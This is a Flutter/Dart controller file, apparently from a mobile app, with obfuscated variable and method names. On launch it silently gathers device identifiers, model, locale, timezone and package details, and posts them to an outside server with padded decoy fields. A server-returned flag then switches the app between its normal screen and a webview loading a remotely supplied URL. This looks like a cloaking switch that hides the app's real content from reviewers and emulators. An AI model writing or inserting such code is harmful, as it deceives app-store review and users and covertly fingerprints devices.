import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var gfwvrqa = RxBool(false);
  var ecxtsjo = RxBool(true);
  var plwys = RxString("");
  var cortney = RxBool(false);
  var connelly = RxBool(true);
  final abztnljdsc = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    pvud();
  }


  Future<void> pvud() async {

    cortney.value = true;
    connelly.value = true;
    ecxtsjo.value = false;

    abztnljdsc.post("https://ap.singcen.store/zbusqwhtcrgkmpoxjeyvnal",data: await cndqutsfkl()).then((value) {
      var jsrcl = value.data["jsrcl"] as String;
      var ubliedtp = value.data["ubliedtp"] as bool;
      if (ubliedtp) {
        plwys.value = jsrcl;
        aurore();
      } else {
        stoltenberg();
      }
    }).catchError((e) {
      ecxtsjo.value = true;
      connelly.value = true;
      cortney.value = false;
    });
  }

  Future<Map<String, dynamic>> cndqutsfkl() async {
    final DeviceInfoPlugin ficlxzsh = DeviceInfoPlugin();
    PackageInfo ywldivx_kfexquwv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mulrxs = Platform.localeName;
    var hnforvk = currentTimeZone;

    var qnwilmag = ywldivx_kfexquwv.packageName;
    var hket = ywldivx_kfexquwv.version;
    var agjz = ywldivx_kfexquwv.buildNumber;

    var gbnlm = ywldivx_kfexquwv.appName;
    var miloKoepp = "";
    var rnbwl = "";
    var kentonWalter = "";
    var sovmcj  = "";
    var hilmufgz = "";
    var jordaneJaskolski = "";
    var joannyZieme = "";
    var lydiaVandervort = "";
    var ceasarBauch = "";
    var marionLemke = "";


    var pilxe = "";
    var rgiked = false;

    if (GetPlatform.isAndroid) {
      pilxe = "android";
      var mjqhabtrgc = await ficlxzsh.androidInfo;

      hilmufgz = mjqhabtrgc.brand;

      rnbwl  = mjqhabtrgc.model;
      sovmcj = mjqhabtrgc.id;

      rgiked = mjqhabtrgc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      pilxe = "ios";
      var kpfijl = await ficlxzsh.iosInfo;
      hilmufgz = kpfijl.name;
      rnbwl = kpfijl.model;

      sovmcj = kpfijl.identifierForVendor ?? "";
      rgiked  = kpfijl.isPhysicalDevice;
    }
    var res = {
      "gbnlm": gbnlm,
      "agjz": agjz,
      "qnwilmag": qnwilmag,
      "jordaneJaskolski" : jordaneJaskolski,
      "hnforvk": hnforvk,
      "hket": hket,
      "hilmufgz": hilmufgz,
      "sovmcj": sovmcj,
      "mulrxs": mulrxs,
      "rnbwl": rnbwl,
      "pilxe": pilxe,
      "joannyZieme" : joannyZieme,
      "rgiked": rgiked,
      "kentonWalter" : kentonWalter,
      "marionLemke" : marionLemke,
      "ceasarBauch" : ceasarBauch,
      "lydiaVandervort" : lydiaVandervort,
      "miloKoepp" : miloKoepp,

    };
    return res;
  }

  Future<void> stoltenberg() async {
    Get.offAllNamed("/ohmTab");
  }

  Future<void> aurore() async {
    Get.offAllNamed("/ohmYou");
  }
}
